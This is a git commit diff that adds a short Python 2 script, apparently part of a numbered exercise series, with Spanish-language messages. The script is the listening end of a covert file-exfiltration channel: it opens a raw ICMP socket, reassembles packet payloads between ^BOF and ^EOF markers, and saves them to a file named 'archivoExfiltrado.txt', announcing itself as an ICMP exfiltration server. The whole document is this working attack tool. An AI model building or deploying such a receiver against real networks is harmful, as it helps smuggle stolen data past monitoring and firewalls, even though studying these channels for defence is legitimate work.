06727a52f9bcd37452d66edebefc149412616874
Antonio Salazar Graván <antsalgra@hotmail.com>
2022-09-11 19:45:36 +0200

    Contenido actualizado

---
+++ 50/icmp_server.py
@@ -0,0 +1,21 @@
+import socket
+
+def listen():
+ s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
+ s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
+ with open('archivoExfiltrado.txt','wb') as catch:
+   print "Iniciado el servidor de exfiltración ICMP..."
+   while True:
+     data, addr = s.recvfrom(1508)
+     print "Recibido paquete %r de %r" % (addr,data)
+     if '^BOF' in data:
+       print "INICIO"
+       continue
+     if '^EOF' in data:
+       catch.write(data[-1472:-4])
+       print "FINAL" 
+       break
+     catch.write(data[-1472:])
+     print "¡¡ Archivo recibido!!"
+
+listen()
